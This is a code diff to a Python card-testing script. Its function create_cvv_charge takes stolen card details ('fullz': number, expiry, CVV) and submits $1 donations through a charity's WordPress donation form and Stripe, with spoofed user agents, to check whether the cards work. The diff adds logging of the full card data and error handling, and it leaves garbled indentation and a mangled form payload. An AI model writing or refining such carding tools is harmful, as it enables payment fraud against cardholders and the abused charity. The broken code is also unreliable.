@@ -1,4 +1,5 @@
 import asyncio
+import logging
 import base64
 import random
 from fake_useragent import UserAgent
@@ -23,6 +24,7 @@ def gets(s, start, end):
 
 
 async def create_cvv_charge(fullz , session):
+            logging.info(f"Starting create_cvv_charge for {fullz}") #ADDED LOGGING
     try:
         cc , mes , ano , cvv = fullz.split("|")
         user_agent          = UserAgent().random
@@ -58,29 +60,31 @@ async def create_cvv_charge(fullz , session):
             return response.text
         
 
-        params = {
-            't': '1740664323418',
-        }
+       params = {
+             't': '1740664323418',
+         }
 
-        files = {
-            'action': (None, 'fluentform_submit'),
-            'data': (None, f'choose_time=One%20Time%20&payment_input=Other%20Amount&custom-payment-amount=1&input_text=Crish%20Niki&email=bob.redrat27@gmail.com&payment_method=stripe&__fluent_form_embded_post_id=263&_fluentform_49_fluentformnonce=2383036afb&_wp_http_referer=%2Fdonate%2F&__stripe_payment_method_id={id}&isFFConversational=true'),
-            'form_id': (None, '49'),
-        }
-
-        response = await session.post(
-            'https://lumivoce.org/wp-admin/admin-ajax.php',
-            params=params,
-            files=files,
-        )
-
-        # print(response.text)
-
-        response =response.text
-        await asyncio.sleep(0.5)
-        return response
-
+         files = {
+             'action': (None, 'fluentform_submit'),
+             'data': (None, f'choose_time-One%20Time%20Payment_input-Other%20Amount&custom_payment-payment_amount=1&input_text-Crish%20Niki&email-bob.redrat27@gmail.com&payment_id=654987987978987'),
+             'form_id': (None, '49'),
+         }
+         logging.info(f"Params: {params}") #ADDED LOGGING
+         logging.info(f"Files: {files}") #ADDED LOGGING
+         try:
+             response = await session.post(
+                 'https://lumivoce.org/wp-admin/admin-ajax.php',
+                 params=params,
+                 files=files,
+             )
+             logging.info(f"Response status: {response.status_code}") #ADDED LOGGING
+             response.raise_for_status() # Check for HTTP errors
+             response =response.text
+             await asyncio.sleep(0.5)
+             logging.info("Returning response") #ADDED LOGGING
+             return response
          except Exception as e:
-         return str(e)
+             logging.exception("Error in create_cvv_charge") #ADDED LOGGING
+             return str(e)
      
 
